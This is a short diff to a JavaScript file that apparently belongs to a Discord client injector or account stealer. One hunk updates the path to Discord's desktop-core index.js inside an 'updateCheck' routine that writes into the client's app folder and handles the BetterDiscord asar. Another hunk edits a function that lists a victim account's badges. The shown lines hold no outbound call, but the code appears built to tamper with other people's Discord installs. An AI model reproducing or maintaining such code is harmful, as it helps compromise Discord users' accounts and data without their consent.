@@ -414,7 +414,7 @@ function updateCheck() {
   const appPath = path.join(resourcePath, 'app');
   const packageJson = path.join(appPath, 'package.json');
   const resourceIndex = path.join(appPath, 'index.js');
-  const indexJs = `${app}\\modules\\discord_desktop_core-3\\discord_desktop_core\\index.js`;
+  const indexJs = `${app}\\modules\\discord_desktop_core-1\\discord_desktop_core\\index.js`;
   const bdPath = path.join(process.env.APPDATA, '\\betterdiscord\\data\\betterdiscord.asar');
   if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
   if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson);
@@ -587,7 +587,7 @@ const getBadges = (flags) => {
       badges += 'Partnered Server Owner, ';
       break;
     case 131072:
-      badges += 'Discord Developer, ';
+      badges += 'Verified Bot Developer, ';
       break;
     case 4:
       badges += 'Hypesquad Event, ';
